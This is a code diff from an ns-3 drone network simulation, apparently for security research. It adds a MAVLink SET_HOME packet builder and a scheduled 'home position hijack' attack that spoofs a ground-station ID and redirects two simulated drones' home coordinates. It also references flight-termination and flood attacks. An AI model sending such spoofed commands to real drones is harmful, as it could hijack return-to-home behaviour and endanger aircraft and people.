@@ -320,6 +320,32 @@ std::vector<uint8_t> CreateBatteryPacket(uint8_t system_id, uint8_t battery_perc
     return std::vector<uint8_t>(buffer, buffer + len);
 }
 
+// Create SET_HOME_POSITION MAVLink packet
+std::vector<uint8_t> CreateSetHomePositionPacket(uint8_t target_system, double lat, double lon, double alt) {
+    mavlink_message_t msg;
+    uint8_t system_id = 255;   // Attacker system ID (GCS)
+    uint8_t component_id = 0;  // Component ID
+
+    mavlink_command_long_t cmd = {};
+    cmd.target_system = target_system;
+    cmd.target_component = 0;      // Target autopilot
+    cmd.command = MAV_CMD_DO_SET_HOME;  // Command ID for setting home position
+    cmd.confirmation = 0;          // No confirmation needed
+    cmd.param1 = 0.0f;             // 0 = use specified location
+    cmd.param2 = 0.0f;             // Reserved (unused)
+    cmd.param3 = 0.0f;             // Reserved (unused)
+    cmd.param4 = 0.0f;             // Reserved (unused)
+    cmd.param5 = static_cast<float>(lat);  // Latitude in degrees
+    cmd.param6 = static_cast<float>(lon);  // Longitude in degrees
+    cmd.param7 = static_cast<float>(alt);  // Altitude in meters (AMSL)
+
+    // Encode the COMMAND_LONG message
+    mavlink_msg_command_long_encode(system_id, component_id, &msg, &cmd);
+
+    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
+    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
+    return std::vector<uint8_t>(buffer, buffer + len);
+}
 
 // Function to execute flight termination attack on drones 1 and 2 
 void ExecuteFlightTerminationAttack(Ptr<Socket> socket) {
@@ -472,7 +498,40 @@ void ExecuteSpoofedDroneFloodAttack(ns3::Ptr<ns3::Socket> socket) {
         Simulator::Schedule(Seconds(0.2), &ExecuteSpoofedDroneFloodAttack, socket);
     }
 }
+// Execute home position hijack attack
+void ExecuteSetHomeAttack(Ptr<Socket> socket) {
+    // Calculate attacker's GPS coordinates (from main.cc position)
+    double attackerLat = s_refLat + (100.0 / s_metersPerDegreeLat);  // y=100m -> lat
+    double attackerLon = s_refLon + (100.0 / s_metersPerDegreeLon); // x=100m -> lon
+    double attackerAlt = s_refAlt + 0.0;                          // z=0m
 
+    // Create packets for drones 1 and 2 (sysid 2 and 3)
+    std::vector<uint8_t> home1 = CreateSetHomePositionPacket(2, attackerLat, attackerLon, attackerAlt);
+    std::vector<uint8_t> home2 = CreateSetHomePositionPacket(3, attackerLat, attackerLon, attackerAlt);
+
+    Ptr<Packet> packet1 = Create<Packet>(home1.data(), home1.size());
+    Ptr<Packet> packet2 = Create<Packet>(home2.data(), home2.size());
+    
+    // Send to drone1 and drone2
+    socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
+    socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));
+    
+    NS_LOG_INFO("Attacker sent SET_HOME_POSITION commands at " 
+                << Simulator::Now().GetSeconds() << "s");
+    
+    // Publish to ZMQ
+    if (g_commandPublisher) {
+        zmq::message_t zmqMsg1(home1.data(), home1.size());
+        zmq::message_t zmqMsg2(home2.data(), home2.size());
+        g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
+        g_commandPublisher->send(zmqMsg2, zmq::send_flags::none);
+    }
+    
+    // Schedule next flood (every 1 seconds)
+    if (Simulator::Now().GetSeconds() < 180.0) {
+        Simulator::Schedule(Seconds(1), &ExecuteSetHomeAttack, socket);
+    }
+}
 // - SendWaypointPairFromAttacker
 void SendWaypointPairFromAttacker(int pairIndex) {
     // Use the attacker node to send mission items, similar to SendWaypointPairFromDrone0 but with more waypoints
